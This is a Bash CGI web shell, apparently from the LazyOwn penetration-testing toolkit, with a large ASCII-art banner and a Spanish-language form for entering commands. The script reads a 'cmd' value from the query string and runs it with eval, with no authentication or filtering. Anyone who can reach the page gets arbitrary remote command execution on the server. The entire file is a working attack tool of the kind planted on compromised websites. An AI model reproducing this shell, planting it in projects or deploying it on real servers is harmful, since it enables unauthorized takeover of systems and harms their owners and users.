#!/bin/bash
BANNER=$(cat << "EOF"
                                                                                                                   
 ____               ____      _____        _____      _____        _____      _____          _____   ______        
|    |         ____|\   \    /    /|___   |\    \    /    /|  ____|\    \    |\    \   _____|\    \ |\     \       
|    |        /    /\    \  /    /|    |  | \    \  /    / | /     /\    \   | |    | /    /|\\    \| \     \      
|    |       |    |  |    ||\____\|    |  |  \____\/    /  //     /  \    \  \/     / |    || \|    \  \     |     
|    |  ____ |    |__|    || |   |/    |___\ |    /    /  /|     |    |    | /     /_  \   \/  |     \  |    |     
|    | |    ||    .--.    | \|___/    /    |\|___/    /  / |     |    |    ||     // \  \   \  |      \ |    |     
|    | |    ||    |  |    |    /     /|    |    /    /  /  |\     \  /    /||    |/   \ |    | |    |\ \|    |     
|____|/____/||____|  |____|   |_____|/____/|   /____/  /   | \_____\/____/ ||\ ___/\   \|   /| |____||\_____/|     
|    |     |||    |  |    |   |     |    | |  |`    | /     \ |    ||    | /| |   | \______/ | |    |/ \|   ||     
|____|_____|/|____|  |____|   |_____|____|/   |_____|/       \|____||____|/  \|___|/\ |    | | |____|   |___|/     
  \(    )/     \(      )/       \(    )/         )/             \(    )/        \(   \|____|/    \(       )/       
   '    '       '      '         '    '          '               '    '          '      )/        '       '        
                                                                                        '                          
  _____                ______         _____           ______   ____   ____      ______    ____         ____        
 |\    \   _____   ___|\     \   ___|\     \      ___|\     \ |    | |    | ___|\     \  |    |       |    |       
 | |    | /    /| |     \     \ |    |\     \    |    |\     \|    | |    ||     \     \ |    |       |    |       
 \/     / |    || |     ,_____/||    | |     |   |    |/____/||    |_|    ||     ,_____/||    |       |    |       
 /     /_  \   \/ |     \--'\_|/|    | /_ _ / ___|    \|   | ||    .-.    ||     \--'\_|/|    |  ____ |    |  ____ 
|     // \  \   \ |     /___/|  |    |\    \ |    \    \___|/ |    | |    ||     /___/|  |    | |    ||    | |    |
|    |/   \ |    ||     \____|\ |    | |    ||    |\     \    |    | |    ||     \____|\ |    | |    ||    | |    |
|\ ___/\   \|   /||____ '     /||____|/____/||\ ___\|_____|   |____| |____||____ '     /||____|/____/||____|/____/|
| |   | \______/ ||    /_____/ ||    /     ||| |    |     |   |    | |    ||    /_____/ ||    |     |||    |     ||
 \|___|/\ |    | ||____|     | /|____|_____|/ \|____|_____|   |____| |____||____|     | /|____|_____|/|____|_____|/
    \(   \|____|/   \( |_____|/   \(    )/       \(    )/       \(     )/    \( |_____|/   \(    )/     \(    )/   
     '      )/       '    )/       '    '         '    '         '     '      '    )/       '    '       '    '    
            '             '                                                        '                               
EOF
)
echo "Content-type: text/html"
echo

echo "<html><body>"
echo "<h1>LazyOwn Webshell en Bash</h1>"
echo "<small><small><small><small><pre>$BANNER</pre></small></small></small></small>"
echo "<form action='lazywebshell.sh' method='GET'>"
echo "Comando: <input type='text' name='cmd'><br>"
echo "<input type='submit' value='Ejecutar'>"
echo "</form>"
echo "<hr>"

if [ "$REQUEST_METHOD" = "GET" ]; then
    cmd=$(echo "$QUERY_STRING" | cut -d'=' -f2 | sed "s/%20/ /g"| tr '+' ' ')

    echo "<h2>Resultado del comando:</h2>"
    echo "<pre>"
    echo "cmd: $cmd QUERY_STRING: $QUERY_STRING"
    eval "$cmd"
    echo "</pre>"
fi

echo "</body></html>"